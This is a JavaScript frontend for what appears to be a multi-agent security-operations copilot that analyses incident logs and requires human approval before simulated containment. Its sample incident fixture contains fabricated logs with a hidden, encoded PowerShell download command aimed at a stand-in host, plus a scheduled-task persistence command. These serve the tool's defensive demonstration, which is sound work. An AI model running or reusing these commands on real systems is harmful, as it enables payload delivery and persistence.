// Agentic SOC Copilot - Frontend Operations Script

const SAMPLE_INCIDENT = {
  incident_id: "INC-2026-8821",
  title: "Suspicious Obfuscated PowerShell Execution with Outbound Beaconing",
  raw_logs: `[2026-09-15T14:22:18Z] [Sysmon Event 1: Process Creation] Host: FIN-WS-042 | User: CORP\\jdoe | Parent: C:\\Windows\\explorer.exe (PID 4112) | Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID 8892) | CommandLine: powershell.exe -nop -w hidden -ep bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwA6ADgAMAA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAGwAIABcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQA= | SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
[2026-09-15T14:22:20Z] [Sysmon Event 3: Network Connect] Host: FIN-WS-042 | Image: powershell.exe (PID 8892) | SourceIp: 10.0.4.15 | SourcePort: 49812 | DestinationIp: 198.51.100.23 | DestinationPort: 8080 | Protocol: tcp | Domain: update-service-check.net
[2026-09-15T14:22:24Z] [Sysmon Event 11: FileCreate] Host: FIN-WS-042 | TargetFilename: C:\\Windows\\Temp\\payload.ps1 | SHA256: 9b10a43f87b21235bcf8e0892095f9c46114e9f7437894a8e388cb20d885a088
[2026-09-15T14:22:31Z] [Sysmon Event 1: Process Creation] Host: FIN-WS-042 | User: CORP\\jdoe | Parent: powershell.exe (PID 8892) | Image: C:\\Windows\\System32\\schtasks.exe | CommandLine: schtasks.exe /create /sc minute /mo 15 /tn "SystemUpdateChecker" /tr "powershell.exe -w hidden -f C:\\Windows\\Temp\\payload.ps1" /ru SYSTEM
[2026-09-15T14:22:45Z] [Perimeter Firewall Alert] Action: PERMIT | Src: 10.0.4.15 | Dst: 198.51.100.23:8080 | Rule: OUTBOUND-WEB-DEV | BytesOut: 1420 | BytesIn: 64280 | ThreatScore: 88`
};

let currentApprovalToken = null;

// Initialize when DOM is ready
document.addEventListener("DOMContentLoaded", () => {
  fetchHealth();
  fetchRecentIncidents();
  setupEventListeners();
});

function setupEventListeners() {
  // Load sample button
  const btnLoadSample = document.getElementById("btn-load-sample");
  if (btnLoadSample) {
    btnLoadSample.addEventListener("click", () => {
      document.getElementById("incident-id").value = SAMPLE_INCIDENT.incident_id;
      document.getElementById("incident-title").value = SAMPLE_INCIDENT.title;
      document.getElementById("raw-logs").value = SAMPLE_INCIDENT.raw_logs;
    });
  }

  // Clear button
  const btnClear = document.getElementById("btn-clear");
  if (btnClear) {
    btnClear.addEventListener("click", () => {
      document.getElementById("incident-form").reset();
    });
  }

  // Refresh history button
  const btnRefreshHistory = document.getElementById("btn-refresh-history");
  if (btnRefreshHistory) {
    btnRefreshHistory.addEventListener("click", fetchRecentIncidents);
  }

  // Incident form submit
  const form = document.getElementById("incident-form");
  if (form) {
    form.addEventListener("submit", handleFormSubmit);
  }

  // Human approval button
  const btnApprove = document.getElementById("btn-approve-containment");
  if (btnApprove) {
    btnApprove.addEventListener("click", handleApproveContainment);
  }
}

async function fetchHealth() {
  try {
    const res = await fetch("/health");
    if (res.ok) {
      const data = await res.json();
      document.getElementById("system-status-text").textContent = "Backend Online";
      const modeVal = document.getElementById("llm-mode-val");
      if (modeVal) {
        modeVal.textContent = data.llm_mode === "OPENAI_LIVE" ? "OpenAI Live" : "Deterministic Fallback";
        modeVal.style.color = data.llm_mode === "OPENAI_LIVE" ? "#38bdf8" : "#fbbf24";
      }
      const kbVal = document.getElementById("kb-count-val");
      if (kbVal) {
        kbVal.textContent = `${data.playbooks_loaded} Playbooks`;
      }
    }
  } catch (err) {
    console.warn("Failed to contact /health:", err);
    document.getElementById("system-status-text").textContent = "Connecting...";
  }
}

async function fetchRecentIncidents() {
  try {
    const res = await fetch("/incidents/recent?limit=8");
    if (!res.ok) return;
    const incidents = await res.json();
    const listContainer = document.getElementById("recent-incidents-list");
    if (!listContainer) return;

    if (!incidents || incidents.length === 0) {
      listContainer.innerHTML = `<div class="empty-state">No past incidents recorded yet.</div>`;
      return;
    }

    listContainer.innerHTML = incidents.map(inc => {
      const sevClass = getSeverityBadgeClass(inc.severity);
      return `
        <div class="recent-item" data-id="${escapeHtml(inc.incident_id)}">
          <div class="recent-top">
            <span class="recent-id">${escapeHtml(inc.incident_id)}</span>
            <span class="badge ${sevClass}">${escapeHtml(inc.severity)}</span>
          </div>
          <div class="recent-title" title="${escapeHtml(inc.title)}">${escapeHtml(inc.title)}</div>
        </div>
      `;
    }).join("");
  } catch (err) {
    console.error("Error fetching recent incidents:", err);
  }
}

async function handleFormSubmit(e) {
  e.preventDefault();

  const incidentId = document.getElementById("incident-id").value.trim();
  const title = document.getElementById("incident-title").value.trim();
  const rawLogs = document.getElementById("raw-logs").value.trim();

  if (!incidentId || !title || !rawLogs) {
    alert("Please fill in all incident fields.");
    return;
  }

  // UI state: analyzing
  setAnalyzingState(true);
  resetStepper();

  // Animate stepper through agent execution
  animateStep("step-triage", "active");
  updatePipelineStatus("ANALYZING (Triage Agent)");

  try {
    const res = await fetch("/incidents/analyze", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        incident_id: incidentId,
        title: title,
        raw_logs: rawLogs
      })
    });

    if (!res.ok) {
      const errData = await res.json().catch(() => ({}));
      throw new Error(errData.detail || `Server error: ${res.status}`);
    }

    const data = await res.json();

    // Mark steps completed
    animateStep("step-triage", "completed");
    animateStep("step-rag", "completed");
    animateStep("step-investigation", "completed");
    animateStep("step-response", "completed");
    animateStep("step-approval", "active");

    updatePipelineStatus("AWAITING HUMAN APPROVAL");

    // Render results
    renderResults(data);
    fetchRecentIncidents();

  } catch (err) {
    alert(`Incident Analysis Failed: ${err.message}`);
    updatePipelineStatus("ERROR");
  } finally {
    setAnalyzingState(false);
  }
}

function renderResults(data) {
  // Hide placeholder, display results container
  document.getElementById("results-placeholder").style.display = "none";
  const container = document.getElementById("results-container");
  container.style.display = "block";

  // 1. Triage Card
  const sevBadge = document.getElementById("badge-severity");
  sevBadge.textContent = data.severity;
  sevBadge.className = `badge ${getSeverityBadgeClass(data.severity)}`;

  document.getElementById("val-category").textContent = data.attack_category;
  document.getElementById("val-incident-title").textContent = `${data.incident_id} - ${data.title}`;
  document.getElementById("val-triage-summary").textContent = data.triage_summary;

  // 2. Human Approval Card
  currentApprovalToken = data.approval_token;
  document.getElementById("val-approval-token").textContent = data.approval_token;
  const appStatusBadge = document.getElementById("badge-approval-status");
  
  if (data.approval_status === "APPROVED") {
    appStatusBadge.textContent = "APPROVED";
    appStatusBadge.className = "badge badge-approved";
    document.getElementById("approval-btn-wrapper").style.display = "none";
    animateStep("step-approval", "completed");
  } else {
    appStatusBadge.textContent = "PENDING APPROVAL";
    appStatusBadge.className = "badge badge-warning";
    document.getElementById("approval-btn-wrapper").style.display = "block";
  }

  // Simulated actions list
  const simList = document.getElementById("list-simulated-actions");
  simList.innerHTML = (data.simulated_actions || []).map(act => `<li>${escapeHtml(act)}</li>`).join("");

  // Clear previous approval result box
  const appResBox = document.getElementById("approval-result-box");
  appResBox.style.display = "none";
  appResBox.innerHTML = "";

  // 3. Extracted IOCs
  renderIOCs(data.extracted_iocs);

  // 4. Retrieved Playbooks
  renderPlaybooks(data.retrieved_playbooks);

  // 5. Investigation Findings
  renderFindings(data.investigation_findings);

  // 6. Response Plan
  const planList = document.getElementById("val-response-plan");
  planList.innerHTML = (data.response_plan || []).map(step => `<li>${escapeHtml(step)}</li>`).join("");

  // 7. Execution Trace log
  renderTraceLogs(data.execution_trace);
}

function renderIOCs(iocs) {
  if (!iocs) return;

  const ips = iocs.ips || [];
  const domains = iocs.domains || [];
  const hashes = iocs.hashes || [];
  const commands = iocs.suspicious_commands || [];

  const totalIocs = ips.length + domains.length + hashes.length + commands.length;
  document.getElementById("badge-ioc-count").textContent = `${totalIocs} Detected`;

  // IPs
  const ipsContainer = document.getElementById("iocs-ips-list");
  if (ips.length === 0) {
    ipsContainer.innerHTML = `<span class="text-muted">None detected</span>`;
  } else {
    ipsContainer.innerHTML = ips.map(ipObj => {
      const isExt = ipObj.type === "EXTERNAL";
      return `<span class="ioc-tag ${isExt ? 'external' : ''}">${escapeHtml(ipObj.ip)} <span class="tag-badge">${escapeHtml(ipObj.type)}</span></span>`;
    }).join("");
  }

  // Domains
  const domContainer = document.getElementById("iocs-domains-list");
  if (domains.length === 0) {
    domContainer.innerHTML = `<span class="text-muted">None detected</span>`;
  } else {
    domContainer.innerHTML = domains.map(d => `<span class="ioc-tag">${escapeHtml(d)}</span>`).join("");
  }

  // Hashes
  const hashContainer = document.getElementById("iocs-hashes-list");
  if (hashes.length === 0) {
    hashContainer.innerHTML = `<span class="text-muted">None detected</span>`;
  } else {
    hashContainer.innerHTML = hashes.map(h => `<span class="ioc-tag">${escapeHtml(h)}</span>`).join("");
  }

  // Commands
  const cmdContainer = document.getElementById("iocs-commands-list");
  if (commands.length === 0) {
    cmdContainer.innerHTML = `<span class="text-muted">None detected</span>`;
  } else {
    cmdContainer.innerHTML = commands.map(c => `<code>${escapeHtml(c)}</code>`).join("");
  }
}

function renderPlaybooks(playbooks) {
  const container = document.getElementById("rag-playbooks-list");
  if (!playbooks || playbooks.length === 0) {
    container.innerHTML = `<div class="empty-state">No matching playbooks retrieved.</div>`;
    document.getElementById("badge-rag-count").textContent = "0 Playbooks";
    return;
  }

  document.getElementById("badge-rag-count").textContent = `${playbooks.length} Grounded`;
  container.innerHTML = playbooks.map(pb => {
    const scorePct = (pb.score * 100).toFixed(1);
    return `
      <div class="rag-item">
        <div class="rag-header">
          <span class="rag-title">${escapeHtml(pb.title)} (${escapeHtml(pb.playbook_id)})</span>
          <span class="rag-score">Relevance: ${scorePct}%</span>
        </div>
        <div class="rag-snippet">${escapeHtml(pb.content_snippet)}</div>
      </div>
    `;
  }).join("");
}

function renderFindings(findingsMarkdown) {
  const container = document.getElementById("val-investigation-findings");
  if (!findingsMarkdown) {
    container.textContent = "No findings generated.";
    return;
  }
  // Convert basic markdown syntax into HTML safely
  let html = escapeHtml(findingsMarkdown);
  html = html.replace(/### (.*)/g, '<h3>$1</h3>');
  html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
  html = html.replace(/`([^`]+)`/g, '<code class="token-code">$1</code>');
  html = html.replace(/^- (.*)/gm, '<li>$1</li>');
  html = html.replace(/(<li>.*<\/li>)/s, '<ul>$1</ul>');
  container.innerHTML = html;
}

function renderTraceLogs(trace) {
  const logBox = document.getElementById("live-trace-log");
  if (!trace || trace.length === 0) {
    logBox.style.display = "none";
    return;
  }
  logBox.style.display = "block";
  logBox.innerHTML = trace.map(t => `<div>[${t.timestamp}] [${escapeHtml(t.agent)}] ${escapeHtml(t.details)}</div>`).join("");
}

async function handleApproveContainment() {
  if (!currentApprovalToken) {
    alert("No active approval token found.");
    return;
  }

  const btnApprove = document.getElementById("btn-approve-containment");
  btnApprove.disabled = true;
  btnApprove.textContent = "Authorizing...";

  try {
    const res = await fetch(`/incidents/approve/${encodeURIComponent(currentApprovalToken)}`, {
      method: "POST"
    });

    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      throw new Error(err.detail || `Approval failed with status ${res.status}`);
    }

    const data = await res.json();

    // Update approval status badge
    const badge = document.getElementById("badge-approval-status");
    badge.textContent = "CONTAINMENT SIMULATED";
    badge.className = "badge badge-approved";

    // Mark Human Gate step as completed
    animateStep("step-approval", "completed");
    updatePipelineStatus("CONTAINMENT SIMULATED & LOGGED");

    // Render audit box
    const resBox = document.getElementById("approval-result-box");
    resBox.style.display = "block";

    const actionsHtml = (data.executed_actions || []).map(act => `
      <div style="margin-top: 0.35rem; font-family: var(--font-mono); font-size: 0.75rem;">
        ✔ [${escapeHtml(act.timestamp)}] <strong>${escapeHtml(act.status)}</strong>: ${escapeHtml(act.action)} 
        <br/><span style="color: #64748b;">↳ Target: ${escapeHtml(act.target)} &bull; ${escapeHtml(act.details)}</span>
      </div>
    `).join("");

    resBox.innerHTML = `
      <div style="color: #10b981; font-weight: 600; margin-bottom: 0.25rem;">
        ✔ Incident Response Authorized (${escapeHtml(data.status)})
      </div>
      <div style="color: var(--text-secondary); font-size: 0.78rem;">
        ${escapeHtml(data.message)}
      </div>
      <div style="margin-top: 0.5rem;">${actionsHtml}</div>
    `;

    document.getElementById("approval-btn-wrapper").style.display = "none";
    fetchRecentIncidents();

  } catch (err) {
    alert(`Approval Error: ${err.message}`);
    btnApprove.disabled = false;
    btnApprove.textContent = "🛡️ Authorize & Simulate Containment";
  }
}

// Helpers
function setAnalyzingState(isAnalyzing) {
  const btn = document.getElementById("btn-analyze");
  const spinner = document.getElementById("analyze-spinner");
  const btnText = btn.querySelector(".btn-text");

  btn.disabled = isAnalyzing;
  spinner.style.display = isAnalyzing ? "inline-block" : "none";
  btnText.textContent = isAnalyzing ? "Agents Executing..." : "🚀 Run Multi-Agent Pipeline";
}

function resetStepper() {
  ["step-triage", "step-rag", "step-investigation", "step-response", "step-approval"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.className = "step-item";
  });
}

function animateStep(stepId, stateClass) {
  const el = document.getElementById(stepId);
  if (el) {
    el.className = `step-item ${stateClass}`;
  }
}

function updatePipelineStatus(statusText) {
  const badge = document.getElementById("pipeline-status");
  if (badge) badge.textContent = statusText;
}

function getSeverityBadgeClass(sev) {
  switch ((sev || "").toUpperCase()) {
    case "CRITICAL": return "badge-critical";
    case "HIGH": return "badge-high";
    case "MEDIUM": return "badge-medium";
    case "LOW": return "badge-low";
    default: return "badge-neutral";
  }
}

function escapeHtml(str) {
  if (typeof str !== "string") return "";
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
